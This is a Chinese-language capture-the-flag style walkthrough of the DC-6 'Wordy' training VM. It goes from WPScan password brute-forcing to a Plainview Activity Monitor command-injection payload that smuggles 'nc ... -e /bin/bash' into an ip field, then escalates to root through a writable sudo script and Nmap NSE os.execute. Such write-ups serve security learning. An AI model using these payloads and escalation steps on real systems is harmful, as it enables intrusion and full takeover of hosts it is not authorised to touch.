# DC-6 靶机实战

## 一、靶机信息

| 项目     | 信息                                |
| -------- | ----------------------------------- |
| 靶机名称 | Wordy                               |
| 靶机 IP  | `172.20.10.7`                       |
| 操作系统 | Debian                              |
| Web 服务 | Apache 2.4.25                       |
| Web 程序 | WordPress                           |
| 初始漏洞 | Plainview Activity Monitor 命令注入 |
| 初始用户 | mark                                |
| 后续用户 | graham、jens                        |
| 最终权限 | root                                |

<img src=".\images\01.png" alt="01" style="zoom:33%;" />

## 二、信息收集

### 1. Nmap 端口扫描

```
nmap -sV -sC 172.20.10.7
```

扫描结果：

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

发现：

- 22：SSH 服务开放。
- 80：Apache Web 服务开放。

<img src=".\images\02.png" alt="01" style="zoom:33%;" />

### 2. Web 信息收集

访问：

```
http://wordy/
http://wordy/wp-admin/
```

发现目标使用 WordPress 搭建。

由于靶机使用主机名 `wordy`，需要在攻击机 `/etc/hosts` 中配置域名解析：

```
echo "172.20.10.7 wordy" >> /etc/hosts
```

<img src=".\images\03.png" alt="01" style="zoom:33%;" />

## 三、WordPress 信息收集与密码爆破

### 1. WPScan 用户枚举

使用 WPScan 枚举 WordPress 用户：

```
wpscan --url http://wordy/ -e u -o 1username.txt
```

参数说明：

- `--url`：指定目标地址。
- `-e u`：枚举 WordPress 用户。
- `-o`：保存扫描结果。

### 2. WordPress 密码爆破

使用用户字典和密码字典进行爆破：

```
wpscan --url http://wordy/ -P 1password.txt -U 1username.txt
```

爆破成功，获得账号：

```
Username: mark
Password: helpdesk01
```

使用该账号登录 WordPress 后台。

<img src=".\images\04.png" alt="01" style="zoom:33%;" />

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

## 四、WordPress 插件漏洞利用

### 1. 发现 Activity Monitor 插件

登录后台后，发现插件：

```
Activity on Wordy
```

进一步发现插件涉及 Plainview Activity Monitor。

本地 Exploit-DB 漏洞文件：

```
exploitdb/exploits/php/webapps/45274.html
```

该漏洞涉及 Plainview Activity Monitor 插件的命令注入问题。

<img src=".\images\06.png" alt="01" style="zoom:33%;" />

### 2. 分析漏洞利用代码

漏洞利用页面中涉及以下 HTML 表单：

```
<input type="hidden" name="ip" value="google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash" />
<input type="hidden" name="lookup" value="Lookup" />
<input type="submit" value="Submit request" />
```

其中：

- `ip`：提交 IP 查询参数，也是漏洞利用的关键参数。
- `lookup`：触发查询功能。
- `nc`：Netcat 网络工具。
- `/bin/bash`：用于获取 Shell。

利用思路是通过构造恶意参数，使服务器在处理 IP 查询时执行额外的系统命令。

<img src=".\images\07.png" alt="01" style="zoom:33%;" />

### 3. Burp Suite 抓包分析

访问后台 Activity Tools 页面：

```
http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools
```

使用 Burp Suite（BP）拦截请求，观察提交的参数。

发现：

```
ip
lookup
```

通过分析请求，发现 `ip` 参数参与服务器端命令处理，存在命令注入利用点。

<img src=".\images\08.png" alt="01" style="zoom:33%;" />

### 4. 获取初始 Shell

利用命令注入漏洞执行系统命令，成功获得目标机器的第一个 Shell。

至此，完成从 WordPress 后台到 Linux 系统的初始入侵。

<img src=".\images\09.png" alt="01" style="zoom:33%;" />

## 五、Linux 信息收集与用户凭据发现

### 1. 查看系统用户

获得初始 Shell 后，查看 `/home` 目录：

```
ls -la /home/
```

发现其他用户：

```
drwxr-xr-x  2 graham graham 4.0K Apr 26  2019 graham
drwxr-xr-x  2 jens   jens   4.0K Apr 26  2019 jens
drwxr-xr-x  3 mark   mark   4.0K Apr 26  2019 mark
drwxr-xr-x  2 sarah  sarah  4.0K Apr 24  2019 sarah
```

说明系统中还存在 Graham、Jens、Sarah 等用户。

<img src=".\images\10.png" alt="01" style="zoom:33%;" />

### 2. 查找敏感信息

查看 Mark 用户目录中的待办文件：

```
cat /home/mark/stuff/things-to-do.txt
```

发现用户凭据：

```
graham - GSo7isUM1D4
```

获得 Graham 用户的密码信息。

<img src=".\images\11.png" alt="01" style="zoom:33%;" />



## 六、Linux 用户权限提升

### 1. 查看 graham 用户的 sudo 权限

切换到 graham 用户环境后，执行：

```
sudo -l
```

<img src=".\images\12.png" alt="01" style="zoom:33%;" />

发现 graham 可以免密码执行：

```
(jens) NOPASSWD: /home/jens/backups.sh
```

说明当前用户可以通过 sudo 以 Jens 身份执行指定备份脚本。

### 2. 利用 backups.sh 获取 Jens Shell

检查脚本：

```
cat /home/jens/backups.sh
```

将脚本内容修改为：

```
#!/bin/bash
/bin/bash
```

然后执行：

```
sudo -u jens /home/jens/backups.sh
```

成功获得 Jens 用户的 Shell。

<img src=".\images\13.png" alt="01" style="zoom:33%;" />

**提权原理：**

- 当前用户具有执行指定脚本的 sudo 权限。
- 如果该脚本允许当前用户修改，就可以改变脚本原本的执行内容。
- 将脚本替换为 Shell 执行命令。
- 通过 sudo 执行脚本，从而获得 Jens 用户权限。

## 七、Jens 用户提权至 Root

### 1. 查看 sudo 权限

进入 Jens 用户环境后，执行：

```
sudo -l
```

发现：

```
(root) NOPASSWD: /usr/bin/nmap
```

说明 Jens 可以免密码以 Root 权限执行 Nmap。

<img src=".\images\14.png" alt="01" style="zoom:33%;" />

### 2. 利用 Nmap NSE 提权

Nmap 支持 NSE（Nmap Scripting Engine），可以通过 Lua 脚本执行自定义操作。

创建恶意 NSE 脚本：

```
echo 'os.execute("/bin/bash")' > /tmp/bash.nse
```

### 3. 执行 NSE 脚本

使用具有 sudo 权限的 Nmap 执行脚本：

```
sudo nmap --script=/tmp/bash.nse
```

由于 Nmap 是以 Root 权限运行，因此 NSE 脚本中的命令也以 Root 权限执行。

成功获得 Root Shell。

<img src=".\images\15.png" alt="01" style="zoom:33%;" />

### 4. 验证提权结果

```
id
```

检查当前用户权限，确认已经获得 Root 权限。

<img src=".\images\16.png" alt="01" style="zoom:33%;" />

## 八、最终攻击链

```
Nmap 端口扫描
      |
      v
发现 22、80 端口开放
      |
      v
发现 WordPress
      |
      v
WPScan 用户枚举
      |
      v
WordPress 密码爆破
      |
      v
获得 mark 账号
      |
      v
登录 WordPress 后台
      |
      v
发现 Plainview Activity Monitor
      |
      v
Activity Tools 命令注入
      |
      v
获得初始 Shell
      |
      v
查看 /home 用户目录
      |
      v
读取 things-to-do.txt
      |
      v
发现 Graham 用户凭据
      |
      v
利用 backups.sh sudo 权限
      |
      v
获得 Jens 用户 Shell
      |
      v
发现 Nmap Root sudo 权限
      |
      v
Nmap NSE 脚本执行命令
      |
      v
获得 Root 权限
```

## 九、实战总结

### 1. 本次涉及的知识点

| 阶段           | 涉及技术                            |
| -------------- | ----------------------------------- |
| 信息收集       | Nmap 端口扫描、服务识别             |
| Web 信息收集   | WordPress 指纹识别                  |
| 用户枚举       | WPScan                              |
| 密码爆破       | WPScan 字典爆破                     |
| 漏洞利用       | Plainview Activity Monitor 命令注入 |
| 请求分析       | Burp Suite 抓包                     |
| Shell 获取     | Netcat、反弹 Shell                  |
| Linux 信息收集 | 用户目录、敏感文件查找              |
| 用户提权       | sudo 脚本提权                       |
| Root 提权      | Nmap NSE 提权                       |

### 2. 个人复盘

**第一阶段：WordPress 信息收集与初始入侵**

通过 WPScan 枚举 WordPress 用户，并进行密码爆破，获得 Mark 用户凭据。登录后台后发现 Activity Monitor 插件，通过 Exploit-DB 找到对应漏洞，结合 BP 抓包分析，利用命令注入获得初始 Shell。

**第二阶段：Linux 信息收集**

获得初始 Shell 后，查看 `/home` 目录，发现多个系统用户。通过读取：

```
/home/mark/stuff/things-to-do.txt
```

发现 Graham 用户的凭据，为后续用户权限提升提供线索。

**第三阶段：sudo 脚本提权**

通过 `sudo -l` 发现备份脚本具有特殊 sudo 执行权限。利用脚本可修改的条件，将脚本内容替换为 `/bin/bash`，获得 Jens 用户 Shell。

**第四阶段：Nmap 提权**

发现 Jens 可以免密码以 Root 身份执行 Nmap。利用 Nmap NSE 功能执行 Lua 命令，最终获得 Root 权限。

### 3. 本次重点掌握

| 技术           | 需要掌握的重点                      |
| -------------- | ----------------------------------- |
| WPScan         | WordPress 用户枚举、密码爆破        |
| 插件漏洞       | Plainview Activity Monitor 命令注入 |
| Burp Suite     | 分析后台请求参数                    |
| Linux 信息收集 | 用户目录、敏感文件查找              |
| sudo 提权      | 可写脚本的权限提升                  |
| Nmap NSE       | 利用脚本执行命令                    |
| Linux 权限     | 用户身份切换、sudo 权限分析         |

### 4. 核心收获

本次 Wordy 靶机的核心在于 Web 漏洞利用与 Linux 多阶段提权。

需要重点掌握：

1. WordPress 用户枚举与密码爆破。
2. Plainview Activity Monitor 插件命令注入。
3. 从普通用户目录中寻找其他用户凭据。
4. 利用可修改的 sudo 脚本提升用户权限。
5. 利用 Nmap NSE 实现 Root 权限提升。